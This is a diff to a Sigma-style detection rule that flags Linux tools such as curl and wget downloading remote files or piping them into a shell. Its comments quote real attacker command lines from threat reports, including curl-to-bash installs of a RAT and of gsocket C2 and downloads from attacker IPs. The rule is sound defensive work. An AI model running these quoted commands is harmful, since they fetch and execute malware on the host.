@@ -7,6 +7,12 @@ body: |-
   description: Fetch a remote file via standard file download tool.
   author: SOC Prime Team
   references:
+      - https://socradar.io/blog/4everable2shell-at-a-glance/
+      - https://www.sentinelone.com/blog/artex-unmasked-the-rise-of-ai-powered-artex-in-cybercrime-espionage/
+      - https://www.stormshield.com/news/cti-trigram-campaign/
+      - https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
+      - https://research.jfrog.com/post/accurasofthire-fake-interview/
+      - https://www.microsoft.com/en-us/security/blog/2026/11/06/artex-abuse-expands-as-cybercriminals-target-financial-sector/
       - https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/
       - https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
       - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
@@ -88,9 +94,10 @@ body: |-
           ParentImage|endswith:
               - 'sh' #bash / sh / zsh
               - 'crond'
+              - '/java' # Apache Axis SOAP fault, attacker Java class fetching jup.sh https://socradar.io/blog/4everable2shell-at-a-glance/
           Image|endswith:
-              - 'wget' # https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
-              - 'curl' #curl -sL http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null; https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks; https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
+              - 'wget' # jup.sh https://socradar.io/blog/4everable2shell-at-a-glance/; https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
+              - 'curl' # jup.sh https://socradar.io/blog/4everable2shell-at-a-glance/; curl to fetch WISP, vshell, AdaptixC2 https://www.sentinelone.com/blog/artex-unmasked-the-rise-of-ai-powered-artex-in-cybercrime-espionage/; curl -L -o CameraDriverUpdate.deb https://research.jfrog.com/post/accurasofthire-fake-interview/; curl -sS -m 25 -o /tmp/.g3 -w dl=%{http_code}/%{size_download}\n http://199.19.95[.]66:8097/gopher_8444.bin https://www.microsoft.com/en-us/security/blog/2026/11/06/artex-abuse-expands-as-cybercriminals-target-financial-sector/; curl -sL http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null; https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks; https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
               - 'ftpget' #https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
               - 'fetch' #fetch -o /tmp/1 hxxp://tnegadge[.]s3.amazonaws.com/dfuJ8t1uhG; https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
       selection_action:
@@ -100,8 +107,8 @@ body: |-
               - 'http'
               - ' | ' #https://kmsec.uk/blog/dprk-text-steganography/; https://isc.sans.edu/diary/rss/32936; https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html; https://www.esentire.com/blog/more-shells-than-a-seafood-buffet-tracking-citrix-netscaler-exploitation-activities-cve-2026-88771
           - CommandLine|contains|all:
-              - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://unit42.paloaltonetworks.com/modern-kubernetes-threats/; https://research.jfrog.com/post/xinference-compromise/; https://research.jfrog.com/post/shai-hulud-here-we-go-again/; https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo; https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
-              - ' -o ' #https://cert.gov.ua/article/6318863; https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure
+              - 'http' # hxxps://accurasofthire[.]com/camera-driver/setup-linux https://research.jfrog.com/post/accurasofthire-fake-interview/; http://199.19.95[.]66:8099/api/download/wisp-linux-amd64-76794b36f757 https://www.microsoft.com/en-us/security/blog/2026/11/06/artex-abuse-expands-as-cybercriminals-target-financial-sector/; https://www.huntress.com/blog/evolving-linux-threat-landscape; https://unit42.paloaltonetworks.com/modern-kubernetes-threats/; https://research.jfrog.com/post/xinference-compromise/; https://research.jfrog.com/post/shai-hulud-here-we-go-again/; https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo; https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
+              - ' -o ' # curl -L -o CameraDriverUpdate.deb https://research.jfrog.com/post/accurasofthire-fake-interview/; -o /tmp/.g3; -o .wf https://www.microsoft.com/en-us/security/blog/2026/11/06/artex-abuse-expands-as-cybercriminals-target-financial-sector/; https://cert.gov.ua/article/6318863; https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure
           - CommandLine|contains|all:
               - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
               - '/tmp' #https://socket.dev/blog/axios-npm-package-compromised; https://medium.com/@quirso_de/global-exploitation-of-cve-2026-59310-by-suspected-chinese-nexus-apt-related-cve-2026-59309-443a79e1466d; https://www.fortinet.com/blog/threat-research/multi-functional-linux-botnet-evooo1bot
@@ -113,9 +120,27 @@ body: |-
               - ' -o' # https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
       selection_pipe:
           CommandLine|contains|all:
-              - 'curl' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; curl -fsSL https://bun.sh/install | bash; https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
+              - 'curl' # bash -c "$(curl -fsSL https://gsocket.io/y)" https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh; curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; curl -fsSL https://bun.sh/install | bash; https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
+              - 'http' # hxxps://gsocket[.]io/y https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
+              - 'bash' # bash -c "$(curl -fsSL https://gsocket.io/y)" https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh; curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
+      selection_pipe_wget:
+          CommandLine|contains|all:
+              - 'wget'
               - 'http'
-              - 'bash' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
+      selection_pipe_wget_shell:
+          CommandLine|contains:
+              - 'bash' # bash -c "$(wget -qO- https://gsocket.io/y)" https://github.com/hackerschoice/gsocket/blob/master/deploy/deploy.sh
+              - '| sh'
+              - '|sh'
+      filters_pipe:
+          CommandLine|contains:
+              - 'get.docker.com'
+              - 'sh.rustup.rs'
+              - 'install.python-poetry.org'
+              - 'deb.nodesource.com'
+              - 'rpm.nodesource.com'
+              - 'localhost'
+              - '127.0.0.1'
       filters:
           CommandLine|contains:
               - 'apt-get'
@@ -130,10 +155,10 @@ body: |-
               - 'github'
               - 'Homebrew'
               - 'cookie' #.../Homebrew/shims/shared/curl --disable --cookie /dev/null --globoff --show-err...
-      condition: ((selection and selection_action) and not filters) or selection_pipe
+      condition: ((selection and selection_action) and not filters) or ((selection_pipe or (selection_pipe_wget and selection_pipe_wget_shell)) and not filters_pipe)
   falsepositives:
       - Administrative activity
   level: low
 level: low
 created: '2020-03-20T10:23:27Z'
-updated: '2026-11-03T10:22:44.965000Z'
+updated: '2026-11-17T09:45:59.739000Z'
